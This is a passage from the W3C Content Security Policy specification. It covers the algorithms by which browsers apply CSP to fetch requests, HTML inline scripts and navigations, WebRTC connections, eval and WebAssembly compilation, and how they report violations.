[request](https://fetch.spec.whatwg.org/#concept-request) should be blocked or allowed, and about whether a
particular
[response](https://fetch.spec.whatwg.org/#concept-response) should be replaced with a [network
error](https://fetch.spec.whatwg.org/#concept-network-error).

1. [§ 4.1.2 Should request be blocked by Content Security
 Policy?](#should-block-request) is
 called as part of step 2.4 of the [Main
 Fetch](https://fetch.spec.whatwg.org/#concept-main-fetch) algorithm. This allows directives\' [pre-request
 checks](#directive-pre-request-check) to be executed against each
 [request](https://fetch.spec.whatwg.org/#concept-request) before it hits the network, and against each
 redirect that a
 [request](https://fetch.spec.whatwg.org/#concept-request) might go through on its way to reaching a resource.

2. [§ 4.1.3 Should response to request be blocked by Content Security
 Policy?](#should-block-response) is
 called as part of step 11 of the [Main
 Fetch](https://fetch.spec.whatwg.org/#concept-main-fetch) algorithm. This allows directives\' [post-request
 checks](#directive-post-request-check) to be executed on the
 [response](https://fetch.spec.whatwg.org/#concept-response) delivered from the network or from a Service
 Worker.

#### 4.1.1. Report Content Security Policy violations for `request`

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, this algorithm reports violations
based on [policy
container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list) \"report only\" policies.

1. Let `CSP list` be `request`'s [policy
 container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `CSP list`:

 1. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then skip to the next
 `policy`.

 2. Let `violates` be the result of executing [§ 6.7.2.1
 Does request violate policy?](#does-request-violate-policy) on
 `request` and `policy`.

 3. If `violates` is not \"`Does Not Violate`\", then
 execute [§ 5.5 Report a violation](#report-violation) on the
 result of executing [§ 2.4.2 Create a violation object for
 request, and policy.](#create-violation-for-request) on
 `request`, and `policy`.

#### 4.1.2. Should `request` be blocked by Content Security Policy?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, this algorithm returns `Blocked`
or `Allowed` and reports violations based on `request`'s
[policy
container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

1. Let `CSP list` be `request`'s [policy
 container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

2. Let `result` be \"`Allowed`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `CSP list`:

 1. If `policy`'s
 [disposition](#policy-disposition) is \"`report`\", then skip to the next
 `policy`.

 2. Let `violates` be the result of executing [§ 6.7.2.1
 Does request violate policy?](#does-request-violate-policy) on
 `request` and `policy`.

 3. If `violates` is not \"`Does Not Violate`\", then:

 1. Execute [§ 5.5 Report a violation](#report-violation) on the
 result of executing [§ 2.4.2 Create a violation object for
 request, and policy.](#create-violation-for-request) on
 `request`, and `policy`.

 2. Set `result` to \"`Blocked`\".

4. Return `result`.

#### 4.1.3. Should `response` to `request` be blocked by Content Security Policy?

Given a
[response](https://fetch.spec.whatwg.org/#concept-response) `response` and a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, this algorithm returns `Blocked`
or `Allowed`, and reports violations based on `request`'s
[policy
container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

1. Let `CSP list` be `request`'s [policy
 container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

2. Let `result` be \"`Allowed`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `CSP list`:

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. If the result of executing `directive`'s
 [post-request
 check](#directive-post-request-check) is \"`Blocked`\", then:

 1. Execute [§ 5.5 Report a violation](#report-violation) on
 the result of executing [§ 2.4.2 Create a violation
 object for request, and
 policy.](#create-violation-for-request) on
 `request`, and `policy`.

 2. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

 This portion of the check verifies that the page
 can load the response. That is, that a Service Worker hasn't
 substituted a file which would violate the page's CSP.

4. Return `result`.

#### 4.1.4. Potentially report hash

Given a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[directive](#directives)
`directive` and a [content security policy
object](#content-security-policy-object) `policy`, run the following steps:

1. Let `algorithm` be the empty
 [string](https://infra.spec.whatwg.org/#string).

2. If `directive`'s
 [value](#directive-value)
 [contains](https://infra.spec.whatwg.org/#list-contain) the expression
 \"[`'report-sha256'`](#grammardef-report-sha256)\", set `algorithm` to \"sha256\".

3. If `directive`'s
 [value](#directive-value)
 [contains](https://infra.spec.whatwg.org/#list-contain) the expression
 \"[`'report-sha384'`](#grammardef-report-sha384)\", set `algorithm` to \"sha384\".

4. If `directive`'s
 [value](#directive-value)
 [contains](https://infra.spec.whatwg.org/#list-contain) the expression
 \"[`'report-sha512'`](#grammardef-report-sha512)\", set `algorithm` to \"sha512\".

5. If `algorithm` is the empty
 [string](https://infra.spec.whatwg.org/#string), return.

6. Let `hash` be the empty
 [string](https://infra.spec.whatwg.org/#string).

7. If `response` is
 [CORS-same-origin](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#cors-same-origin), then:

 1. Let `h` be the result of [applying algorithm to
 bytes](https://w3c.github.io/webappsec-subresource-integrity#apply-algorithm-to-response) on `response`'s
 [body](https://fetch.spec.whatwg.org/#concept-response-body) and `algorithm`.

 2. Let `hash` be the
 [concatenation](https://infra.spec.whatwg.org/#string-concatenate) of `algorithm`, U+2D (-), and
 `h`.

8. Let `global` be the `request`'s
 [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object).

9. If `global` is not a
 [`Window`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window), return.

10. Let `stripped document URL` to be the result of executing
 [§ 5.4 Strip URL for use in reports](#strip-url-for-use-in-reports)
 on `global`'s
 [document](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window)'s
 [URL](https://dom.spec.whatwg.org/#concept-document-url).

11. If `policy`'s [directive
 set](#policy-directive-set) does not contain a
 [directive](#directives) named
 \"report-to\", return.

12. Let `report-to directive` be a
 [directive](#directives)
 named \"report-to\" from `policy`'s [directive
 set](#policy-directive-set).

13. Let `body` be a [csp hash report
 body](#csp-hash-report-body) with `stripped document URL` as its
 [documentURL](#csp-hash-report-body-documenturl), `request`'s URL as its
 [subresourceURL](#csp-hash-report-body-subresourceurl), `hash` as its
 [hash](#csp-hash-report-body-hash), `request`'s
 [destination](https://fetch.spec.whatwg.org/#concept-request-destination) as its
 [destination](#csp-hash-report-body-destination), and \"subresource\" as its
 [type](#csp-hash-report-body-type).

14. [Generate and queue a
 report](https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report) with the following arguments:

 `context`

 : `settings object`

 `type`

 : \"csp-hash\"

 `destination`

 : `report-to directive`'s
 [value](#directive-value).

 `data`

 : `body`

### 4.2. Integration with HTML

1. The [policy
 container](https://html.spec.whatwg.org/multipage/browsers.html#policy-container) has a [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list), which holds all the
 [policy](#content-security-policy-object) objects which are active for a given context. This
 list is empty unless otherwise specified, and is populated from the
 [response](https://fetch.spec.whatwg.org/#concept-response) by
 [parsing](#abstract-opdef-parse-a-responses-content-security-policies)
 [response](https://fetch.spec.whatwg.org/#concept-response)'s Content Security Policies or inherited following
 the rules of the [policy
 container](https://html.spec.whatwg.org/multipage/browsers.html#policy-container).

2. A [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object)'s [CSP list] is
 the result of executing [§ 4.2.2 Retrieve the CSP list of an
 object](#get-csp-of-object) with the [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) as the `object`.

3. A
 [policy](#content-security-policy-object) is [enforced] or [monitored] for a [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) by inserting it into the [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object)'s [CSP
 list](#global-object-csp-list).

4. [§ 4.2.1 Run CSP initialization for a
 Document](#run-document-csp-initialization)
 is called during the [create and initialize a new `Document`
 object](https://html.spec.whatwg.org/#initialise-the-document-object) algorithm.

5. [§ 4.2.3 Should element's inline type behavior be blocked by Content
 Security
 Policy?](#should-block-inline) is
 called during the [prepare the script
 element](https://html.spec.whatwg.org/#prepare-the-script-element) and [update a `style`
 block](https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block) algorithms in order to determine whether or not an
 inline script or style block is allowed to execute/render.

6. [§ 4.2.3 Should element's inline type behavior be blocked by Content
 Security
 Policy?](#should-block-inline) is
 called during handling of inline event handlers (like `onclick`) and
 inline `style` attributes in order to determine whether or not they
 ought to be allowed to execute/render.

7. [policy](#content-security-policy-object) is [enforced](#enforced) during processing of the
 [`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element's
 [`http-equiv`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv).

8. HTML populates each
 [request](https://fetch.spec.whatwg.org/#concept-request)'s [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and [parser
 metadata](https://fetch.spec.whatwg.org/#concept-request-parser-metadata) with relevant data from the elements responsible
 for resource loading.

 (#issue-5599665e) Stylesheet loading is not yet
 integrated with Fetch in WHATWG's HTML. [\[whatwg/html Issue
 #968\]](https://github.com/whatwg/html/issues/968)

9. [§ 6.3.1.1 Is base allowed for
 document?](#allow-base-for-document)
 is called during
 [`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element)'s [set the frozen base
 URL](https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url) algorithm to ensure that the
 [`href`](https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href) attribute's value is valid.

10. [§ 4.2.4 Should navigation request of type be blocked by Content
 Security
 Policy?](#should-block-navigation-request)
 is called during the [create navigation params by
 fetching](https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching) algorithm, and [§ 4.2.5 Should navigation response
 to navigation request of type in target be blocked by Content
 Security
 Policy?](#should-block-navigation-response)
 is called during the [attempt to populate the history entry's
 document](https://html.spec.whatwg.org/multipage/browsing-the-web.html#attempt-to-populate-the-history-entry's-document) algorithm to apply directive's navigation checks,
 as well as inline checks for navigations to `javascript:` URLs.

11. [§ 4.2.6 Run CSP initialization for a global
 object](#run-global-object-csp-initialization)
 is called during the [run a
 worker](https://html.spec.whatwg.org/multipage/workers.html#run-a-worker) algorithm.

12. The [sandbox](#sandbox) directive
 is used to populate the [CSP-derived sandboxing
 flags](https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags).

#### 4.2.1. Run `CSP` initialization for a `Document`

Given a
[`Document`](https://dom.spec.whatwg.org/#document) `document`, the user agent performs the
following steps in order to initialize CSP for `document`:

1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `document`'s
 [policy
 container](https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list):

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. Execute `directive`'s
 [initialization](#directive-initialization) algorithm on `document`, and
 assert: its returned value is \"`Allowed`\".

#### 4.2.2. Retrieve the [CSP list of an `object` ]
To obtain `object`'s [CSP
list](#global-object-csp-list):

1. If `object` is a
 [`Document`](https://dom.spec.whatwg.org/#document) return `object`'s [policy
 container](https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

2. If `object` is a
 [`Window`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window) or a
 [`WorkerGlobalScope`](https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope) or a
 [`WorkletGlobalScope`](https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope), return [environment settings
 object](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object)'s [policy
 container](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list).

3. Return null.

#### 4.2.3. Should `element`'s inline `type` behavior be blocked by Content Security Policy?

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, and a
string `source` this algorithm returns \"`Allowed`\" if the
element is allowed to have inline definition of a particular type of
behavior (script execution, style application, event handlers, etc.),
and \"`Blocked`\" otherwise:

 The valid values for `type` are
\"`script`\", \"`script attribute`\", \"`style`\", and
\"`style attribute`\".

1. Assert: `element` is not null.

2. Let `result` be \"`Allowed`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `element`'s
 [`Document`](https://dom.spec.whatwg.org/#document)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object)'s [CSP
 list](#global-object-csp-list):

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`'s
 [directive
 set](#policy-directive-set):

 1. If `directive`'s [inline
 check](#directive-inline-check) returns \"`Allowed`\" when executed upon
 `element`, `type`, `policy`
 and `source`, skip to the next
 `directive`.

 2. Let `directive-name` be the result of executing
 [§ 6.8.2 Get the effective directive for inline
 checks](#effective-directive-for-inline-check) on
 `type`.

 3. Otherwise, let `violation` be the result of
 executing [§ 2.4.1 Create a violation object for global,
 policy, and directive](#create-violation-for-global) on the
 [current settings
 object](https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global), `policy`, and
 `directive-name`.

 4. Set `violation`'s
 [resource](#violation-resource) to \"`inline`\".

 5. Set `violation`'s
 [element](#violation-element) to `element`.

 6. If `directive`'s
 [value](#directive-value)
 [contains](https://infra.spec.whatwg.org/#list-contain) the expression
 \"[`'report-sample'`](#grammardef-report-sample)\", then set `violation`'s
 [sample](#violation-sample) to the substring of `source`
 containing its first 40 characters.

 7. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 8. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

4. Return `result`.

#### 4.2.4. Should `navigation request` of `type` be blocked by Content Security Policy?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `navigation request` and a string
`type` (either \"`form-submission`\" or \"`other`\"), this
algorithm return \"`Blocked`\" if the active policy blocks the
navigation, and \"`Allowed`\" otherwise:

1. Let `result` be \"`Allowed`\".

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of
 `navigation request`'s [policy
 container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list):

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. If `directive`'s [pre-navigation
 check](#directive-pre-navigation-check) returns \"`Allowed`\" when executed upon
 `navigation request`, `type`, and
 `policy` skip to the next `directive`.

 2. Otherwise, let `violation` be the result of
 executing [§ 2.4.1 Create a violation object for global,
 policy, and directive](#create-violation-for-global) on
 `navigation request`'s
 [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global), `policy`, and
 `directive`'s
 [name](#directive-name).

 3. Set `violation`'s
 [resource](#violation-resource) to `navigation request`'s
 [URL](https://fetch.spec.whatwg.org/#concept-request-url).

 4. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 5. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

3. If `result` is \"`Allowed`\", and if
 `navigation request`'s [current
 URL](https://fetch.spec.whatwg.org/#concept-request-current-url)'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is `javascript`:

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of
 `navigation request`'s [policy
 container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list):

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of
 `policy`:

 1. Let `directive-name` be the result of
 executing [§ 6.8.2 Get the effective directive for
 inline checks](#effective-directive-for-inline-check) on
 \"`navigation`\".

 2. If `directive`'s [inline
 check](#directive-inline-check) returns \"`Allowed`\" when executed
 upon null, \"`navigation`\" and
 `navigation request`'s [current
 URL](https://fetch.spec.whatwg.org/#concept-request-current-url), skip to the next
 `directive`.

 3. Otherwise, let `violation` be the result of
 executing [§ 2.4.1 Create a violation object for global,
 policy, and directive](#create-violation-for-global) on
 `navigation request`'s
 [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global), `policy`, and
 `directive-name`.

 4. Set `violation`'s
 [resource](#violation-resource) to \"`inline`\".

 5. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 6. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

4. Return `result`.

#### 4.2.5. Should `navigation response` to `navigation request` of `type` in `target` be blocked by Content Security Policy?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `navigation request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `navigation response`, a [CSP
list](#csp-list)
`response CSP list`, a string `type` (either
\"`form-submission`\" or \"`other`\"), and a
[navigable](https://html.spec.whatwg.org/#navigable) `target`, this algorithm returns
\"`Blocked`\" if the active policy blocks the navigation, and
\"`Allowed`\" otherwise:

1. Let `result` be \"`Allowed`\".

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of
 `response CSP list`:

 Some directives (like
 [frame-ancestors](#frame-ancestors)) allow a `response`'s [Content Security
 Policy](#content-security-policy) to act on the navigation.

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. If `directive`'s [navigation response
 check](#directive-navigation-response-check) returns \"`Allowed`\" when executed upon
 `navigation request`, `type`,
 `navigation response`, `target`,
 \"`response`\", and `policy` skip to the next
 `directive`.

 2. Otherwise, let `violation` be the result of
 executing [§ 2.4.1 Create a violation object for global,
 policy, and directive](#create-violation-for-global) on
 null, `policy`, and `directive`'s
 [name](#directive-name).

 We use null for the global object, as no
 global exists: we haven't processed the navigation to create
 a Document yet.

 3. Set `violation`'s
 [resource](#violation-resource) to `navigation response`'s
 [URL](https://fetch.spec.whatwg.org/#concept-response-url).

 4. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 5. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of
 `navigation request`'s [policy
 container](https://fetch.spec.whatwg.org/#concept-request-policy-container)'s [CSP
 list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list):

 Some directives in the
 `navigation request`'s context (like
 [frame-ancestors](#frame-ancestors)) need the `response` before acting on
 the navigation.

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. If `directive`'s [navigation response
 check](#directive-navigation-response-check) returns \"`Allowed`\" when executed upon
 `navigation request`, `type`,
 `navigation response`, `target`,
 \"`source`\", and `policy` skip to the next
 `directive`.

 2. Otherwise, let `violation` be the result of
 executing [§ 2.4.1 Create a violation object for global,
 policy, and directive](#create-violation-for-global) on
 `navigation request`'s
 [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global), `policy`, and
 `directive`'s
 [name](#directive-name).

 3. Set `violation`'s
 [resource](#violation-resource) to `navigation request`'s
 [URL](https://fetch.spec.whatwg.org/#concept-request-url).

 4. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 5. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

4. Return `result`.

#### 4.2.6. Run `CSP` initialization for a global object

Given a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) `global`, the user agent performs the
following steps in order to initialize CSP for `global`. This
algorithm returns \"`Allowed`\" if `global` is allowed, and
\"`Blocked`\" otherwise:

1. Let `result` be \"`Allowed`\".

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `global`'s [CSP
 list](#global-object-csp-list):

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. Execute `directive`'s
 [initialization](#directive-initialization) algorithm on `global`. If its
 returned value is \"`Blocked`\", then set
 `result` to \"`Blocked`\".

3. Return `result`.

### 4.3. Integration with WebRTC

The
[administratively-prohibited](https://www.w3.org/TR/webrtc/#dfn-administratively-prohibited) algorithm calls [§ 4.3.1 Should RTC connections be
blocked for global?](#should-block-rtc-connection) when invoked, and
prohibits all candidates if it returns \"`Blocked`\".

#### 4.3.1. Should RTC connections be blocked for `global`?

Given a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) `global`, this algorithm returns
\"`Blocked`\" if the active policy for `global` blocks RTC
connections, and \"`Allowed`\" otherwise:

1. Let `result` be \"`Allowed`\".

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `global`'s [CSP
 list](#global-object-csp-list):

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. If `directive`'s [webrtc pre-connect
 check](#directive-webrtc-pre-connect-check) returns \"`Allowed`\",
 [continue](https://infra.spec.whatwg.org/#iteration-continue).

 2. Otherwise, let `violation` be the result of
 executing [§ 2.4.1 Create a violation object for global,
 policy, and directive](#create-violation-for-global) on
 `global`, `policy`, and
 `directive`'s
 [name](#directive-name).

 3. Set `violation`'s
 [resource](#violation-resource) to null.

 4. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 5. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

3. Return `result`.

### 4.4. Integration with ECMAScript

ECMAScript defines a
[`HostEnsureCanCompileStrings()`](https://tc39.github.io/ecma262#sec-hostensurecancompilestrings) abstract operation which allows the host environment to
block the compilation of strings into ECMAScript code. This document
defines an implementation of that abstract operation which examines the
relevant [CSP
list](#global-object-csp-list) to determine whether such compilation ought to be
blocked.

#### 4.4.1. EnsureCSPDoesNotBlockStringCompilation(`realm`, `parameterStrings`, `bodyString`, `codeString`, `compilationType`, `parameterArgs`, `bodyArg`)

Given a [realm](https://tc39.github.io/ecma262#realm) `realm`, a list of strings
`parameterStrings`, a string `bodyString`, a
string `codeString`, an enum (`compilationType`),
a list of ECMAScript language values (`parameterArgs`), and
an ECMAScript language value (`bodyArg`), this algorithm
returns normally if string compilation is allowed, and throws an
\"`EvalError`\" if not:

1. If `compilationType` is \"`TIMER`\", then:

 1. Let `sourceString` be `codeString`.

2. Else:

 1. Let `compilationSink` be \"Function\" if
 `compilationType` is \"`FUNCTION`\", and \"eval\"
 otherwise.

 2. Let `isTrusted` be `true` if `bodyArg`
 [implements](https://webidl.spec.whatwg.org/#implements)
 [`TrustedScript`](https://www.w3.org/TR/trusted-types/#trustedscript), and `false` otherwise.

 3. If `isTrusted` is `true` then:

 1. If `bodyString` is not equal to
 `bodyArg`'s
 [data](https://www.w3.org/TR/trusted-types/#trustedscript-data), set `isTrusted` to `false`.

 4. If `isTrusted` is `true`, then:

 1. Assert: `parameterArgs`' \[list/size=\] is equal
 to \[parameterStrings\]\'
 [size](https://infra.spec.whatwg.org/#list-size).

 2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `index` of [the
 range](https://infra.spec.whatwg.org/#the-range) 0 to \|parameterArgs\]\' \[list/size=\]:

 1. Let `arg` be
 `parameterArgs`\[`index`\].

 2. If `arg`
 [implements](https://webidl.spec.whatwg.org/#implements)
 [`TrustedScript`](https://www.w3.org/TR/trusted-types/#trustedscript), then:

 1. if
 `parameterStrings`\[`index`\]
 is not equal to `arg`'s
 [data](https://www.w3.org/TR/trusted-types/#trustedscript-data), set `isTrusted` to
 `false`.

 3. Otherwise, set `isTrusted` to `false`.

 5. Let `sourceToValidate` be a
 [new](https://webidl.spec.whatwg.org/#new)
 [`TrustedScript`](https://www.w3.org/TR/trusted-types/#trustedscript) object created in `realm` whose
 [data](https://www.w3.org/TR/trusted-types/#trustedscript-data) is set to `codeString` if
 `isTrusted` is `true`, and `codeString`
 otherwise.

 6. Let `sourceString` be the result of executing the
 [get trusted type compliant
 string](https://www.w3.org/TR/trusted-types/#get-trusted-type-compliant-string) algorithm, with
 [`TrustedScript`](https://www.w3.org/TR/trusted-types/#trustedscript), `realm`,
 `sourceToValidate`, `compilationSink`, and
 `'script'`.

 7. If the algorithm throws an error, throw an
 [`EvalError`](https://webidl.spec.whatwg.org/#exceptiondef-evalerror).

 8. If `sourceString` is not equal to
 `codeString`, throw an
 [`EvalError`](https://webidl.spec.whatwg.org/#exceptiondef-evalerror).

3. Let `result` be \"`Allowed`\".

4. Let `global` be `realm`'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global).

5. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `global`'s [CSP
 list](#global-object-csp-list):

 1. Let `source-list` be null.

 2. If `policy` contains a
 [directive](#directives)
 whose [name](#directive-name) is \"`script-src`\", then set
 `source-list` to that
 [directive](#directives)'s
 [value](#directive-value).

 Otherwise if `policy` contains a
 [directive](#directives)
 whose [name](#directive-name) is \"`default-src`\", then set
 `source-list` to that directive's
 [value](#directive-value).

 3. If `source-list` is not null:

 1. Let `trustedTypesRequired` be the result of
 executing [does sink type require trusted
 types?](https://www.w3.org/TR/trusted-types/#does-sink-type-require-trusted-types), with `realm`, `'script'`, and
 `false`.

 2. If `trustedTypesRequired` is `true` and
 `source-list` contains a [source
 expression](#source-expression) which is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string
 \"[`'trusted-types-eval'`](#grammardef-trusted-types-eval)\", then skip the following steps.

 3. If `source-list` contains a [source
 expression](#source-expression) which is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string
 \"[`'unsafe-eval'`](#grammardef-unsafe-eval)\", then skip the following steps.

 4. Let `violation` be the result of executing
 [§ 2.4.1 Create a violation object for global, policy, and
 directive](#create-violation-for-global) on
 `global`, `policy`, and
 \"`script-src`\".

 5. Set `violation`'s
 [resource](#violation-resource) to \"`eval`\".

 6. If `source-list`
 [contains](https://infra.spec.whatwg.org/#list-contain) the expression
 \"[`'report-sample'`](#grammardef-report-sample)\", then set `violation`'s
 [sample](#violation-sample) to the substring of
 `sourceString` containing its first 40
 characters.

 7. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 8. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

6. If `result` is \"`Blocked`\", throw an `EvalError`
 exception.

### 4.5. Integration with WebAssembly

WebAssembly defines the
[`HostEnsureCanCompileWasmBytes()`](https://webassembly.github.io/content-security-policy/js-api/#host-ensure-can-compile-wasm-bytes) abstract operation which allows the host environment to
block the compilation of WebAssembly sources into executable code. This
document defines an implementation of this abstract operation which
examines the relevant [CSP
list](#global-object-csp-list) to determine whether such compilation ought to be
blocked.

#### 4.5.1. EnsureCSPDoesNotBlockWasmByteCompilation`realm`

Given a [realm](https://tc39.github.io/ecma262#realm) `realm`, this algorithm returns normally if
compilation is allowed, and throws a
[`WebAssembly.CompileError`](https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror) if not:

1. Let `global` be `realm`'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global).

2. Let `result` be \"`Allowed`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `global`'s [CSP
 list](#global-object-csp-list):

 1. Let `source-list` be null.

 2. If `policy` contains a
 [directive](#directives)
 whose [name](#directive-name) is \"`script-src`\", then set
 `source-list` to that
 [directive](#directives)'s
 [value](#directive-value).

 Otherwise if `policy` contains a
 [directive](#directives)
 whose [name](#directive-name) is \"`default-src`\", then set
 `source-list` to that directive's
 [value](#directive-value).

 3. If `source-list` is non-null, and does not contain a
 [source
 expression](#source-expression) which is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string
 \"[`'unsafe-eval'`](#grammardef-unsafe-eval)\", and does not contain a [source
 expression](#source-expression) which is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string
 \"[`'wasm-unsafe-eval'`](#grammardef-wasm-unsafe-eval)\", then:

 1. Let `violation` be the result of executing
 [§ 2.4.1 Create a violation object for global, policy, and
 directive](#create-violation-for-global) on
 `global`, `policy`, and
 \"`script-src`\".

 2. Set `violation`'s
 [resource](#violation-resource) to \"`wasm-eval`\".

 3. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 4. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", then set
 `result` to \"`Blocked`\".

4. If `result` is \"`Blocked`\", throw a
 [`WebAssembly.CompileError`](https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror) exception.

## 5. Reporting

When one or more of a
